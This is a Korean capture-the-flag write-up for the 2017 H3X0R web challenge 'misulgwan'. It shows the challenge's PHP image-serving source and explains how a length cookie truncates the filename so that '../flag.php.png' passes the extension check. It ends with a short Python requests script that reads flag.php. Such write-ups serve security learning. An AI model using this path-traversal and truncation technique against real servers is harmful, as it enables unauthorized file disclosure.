======================================================
[2017_H3X0R] [WEB] misulgwan
======================================================

문제 내용
======================================================

server 1: http://pphp.dothome.co.kr/
server 2:http://jellycleaner.dothome.co.kr/
server 3: http://39.120.34.116:12345/misulgwan/


문제 풀이
======================================================

해당 사이트에 접속해서 소스보기를 해보면 소스코드 제공 페이지가 존재한다.

.. code-block:: html

    <!--<a href='./view.php?view-source'>view source</a> -->

PHP 소스코드는 아래와 같다.

.. code-block:: php

    welcome to misulgwan. 
    <?php
    error_reporting(0);
    include 'flag.php'; # flag is in the flag.php

    if(isset($_GET['image'], $_COOKIE['length'])){
        $ext = explode(".", strrev($_GET['image']));
        $ext = strrev($ext[0]);
        if(!preg_match("/png|jpg|bmp/i", $ext)) exit("no hack");

        $image = substr($_GET['image'], 0, $_COOKIE['length']);
        $view = fopen("./image/".$image, 'rb');

        header("Content-Type: image/png");
        fpassthru($view);
    }
    else {
        echo "welcome to misulgwan.";
    }

    if(isset($_GET['view-source'])){
        highlight_file(__FILE__);
    }
    ?>

문제를 볼 때 항상 입력값과 출력값을 염두해두자. 입력값은 image 파라미터와 length 쿠키 값이고, 출력하고자하는 값은 flag.php 내용이다.
출력 값인 flag.php 파일 내용을 가져오기 위해서는, 조건문이 2개 맞아야 한다.

1. 파일명 뒤에 확장자가 png, jpg, bmp여야 한다.
2. 해당 파읾명을 읽을 때 전체 입력한 값을 가져오는게 아니라, length 쿠키 값까지만 읽어서 가져오므로 flag.php까지만 읽을 수 있도록 length 쿠키 값을 맞춰보내야 한다.


다음과 같은 python 코드를 통해 플래그를 획득한다.

.. code-block:: python

    import requests

    url = "http://pphp.dothome.co.kr/view.php?image=../flag.php.png"
    header = {
        "Cookie":"length=11"
    }
    r = requests.get(url,headers=header)
    print r.content

